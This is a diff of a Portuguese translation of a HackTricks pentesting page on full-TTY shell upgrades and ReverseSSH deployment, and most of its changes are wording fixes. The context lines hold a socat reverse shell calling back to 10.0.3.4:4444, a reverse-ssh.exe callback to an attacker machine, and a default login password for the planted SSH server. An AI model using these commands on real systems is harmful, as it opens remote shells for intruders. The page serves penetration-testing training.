@@ -10,7 +10,7 @@ Aprenda e pratique Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt=""
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 {% endhint %}
@@ -23,7 +23,7 @@ Aprofunde sua experiência em **Segurança Móvel** com a 8kSec Academy. Domine 
 
 ## Full TTY
 
-Observe que o shell que você define na variável `SHELL` **deve** estar **listado dentro** de _**/etc/shells**_ ou `O valor da variável SHELL não foi encontrado no arquivo /etc/shells Este incidente foi relatado`. Além disso, note que os próximos trechos funcionam apenas no bash. Se você estiver em um zsh, mude para um bash antes de obter o shell executando `bash`.
+Note que o shell que você definir na variável `SHELL` **deve** estar **listado dentro** de _**/etc/shells**_ ou `O valor da variável SHELL não foi encontrado no arquivo /etc/shells Este incidente foi relatado`. Além disso, note que os próximos trechos funcionam apenas no bash. Se você estiver em um zsh, mude para um bash antes de obter o shell executando `bash`.
 
 #### Python
 
@@ -73,7 +73,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-Uma maneira conveniente de **acesso a shell interativo**, bem como **transferências de arquivos** e **encaminhamento de portas**, é implantar o servidor ssh estáticamente vinculado [ReverseSSH](https://github.com/Fahrj/reverse-ssh) no alvo.
+Uma maneira conveniente para **acesso a shell interativo**, bem como **transferências de arquivos** e **encaminhamento de portas**, é implantar o servidor ssh estáticamente vinculado [ReverseSSH](https://github.com/Fahrj/reverse-ssh) no alvo.
 
 Abaixo está um exemplo para `x86` com binários comprimidos com upx. Para outros binários, verifique a [página de lançamentos](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
@@ -110,7 +110,7 @@ reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
 {% endcode %}
 
-* Se o pedido de encaminhamento de porta ReverseSSH foi bem-sucedido, você deve agora ser capaz de fazer login com a senha padrão `letmeinbrudipls` no contexto do usuário que está executando `reverse-ssh(.exe)`:
+* Se o pedido de encaminhamento de porta ReverseSSH foi bem-sucedido, você deve agora conseguir fazer login com a senha padrão `letmeinbrudipls` no contexto do usuário que está executando `reverse-ssh(.exe)`:
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -142,7 +142,7 @@ Aprenda e pratique Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt=""
 
 <details>
 
-<summary>Suporte ao HackTricks</summary>
+<summary>Support HackTricks</summary>
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
